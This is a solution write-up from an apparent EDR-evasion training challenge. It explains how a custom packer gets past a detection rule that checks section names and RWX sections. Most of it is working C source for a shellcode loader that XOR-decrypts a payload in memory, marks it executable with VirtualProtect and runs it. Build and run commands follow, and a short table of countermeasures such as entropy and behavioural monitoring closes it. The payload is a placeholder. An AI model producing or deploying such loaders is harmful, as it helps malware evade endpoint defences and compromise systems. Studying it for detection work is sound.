---
title: "Solution 34: Custom Packer / Crypter"
difficulty: hard
category: "Packer & PE Evasion"
---

[Back to Challenge]({{ '/challenges/34-custom-packer/' | relative_url }})

## Overview

A custom packer with normal section names and no RWX sections on disk is invisible to Rule 9's static analysis.

## Solution

```c
// minimal_packer.c — XOR-encrypts a shellcode payload into .data
// At runtime: allocate RWX memory, decrypt, execute
// On disk: normal .text + .data sections, no packer signatures

#include <windows.h>
#include <stdio.h>

// XOR key — in production, use a random key per build
#define XOR_KEY 0x41

// Encrypted payload stored in .data section (normal RW permissions)
// This is just calc.exe shellcode as an example — replace as needed
unsigned char encrypted_payload[] = {
    // XOR-encrypted payload bytes go here
    0x00  // placeholder
};

int main() {
    // Step 1: Allocate memory with RW (not RWX yet!)
    LPVOID mem = VirtualAlloc(NULL, sizeof(encrypted_payload),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!mem) return 1;

    // Step 2: Decrypt payload in-place
    for (size_t i = 0; i < sizeof(encrypted_payload); i++) {
        ((unsigned char*)mem)[i] = encrypted_payload[i] ^ XOR_KEY;
    }

    // Step 3: Change to executable (RWX only in memory, never on disk)
    DWORD oldProtect;
    VirtualProtect(mem, sizeof(encrypted_payload),
        PAGE_EXECUTE_READ, &oldProtect);

    // Step 4: Execute
    ((void(*)())mem)();

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

```powershell
# Build with normal settings — no special flags needed
cl /O2 minimal_packer.c /Fe:loader.exe

# Verify: no packer sections, no RWX sections on disk
dumpbin /headers loader.exe | findstr "Section\|Characteristics"
# Output shows normal .text (RX), .data (RW), .rdata (R) — no RWX

# Run — Rule 9 sees nothing suspicious
.\loader.exe
```

## Why It Works

Rule 9 has two detection vectors, both defeated:

1. **Section names**: Custom packer uses `.text`, `.data`, `.rdata` — normal names
2. **RWX sections**: The payload section is `RW` on disk; `VirtualProtect` adds execute permission only at runtime

The missing detection: **entropy analysis**. The `.data` section contains XOR-encrypted data with near-maximum Shannon entropy (~7.99 bits/byte), which would be a strong indicator of packing — but the EDR doesn't check entropy.

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| Section entropy analysis | Flags sections with entropy > 7.0 |
| Behavioral monitoring | Detects VirtualAlloc → write → VirtualProtect → execute pattern |
| API call sequence analysis | Flags the classic unpack sequence |
| Memory scanning | Periodic re-scan of process memory for known patterns |
| ETW-TI | Kernel-level visibility into VirtualProtect and memory writes |
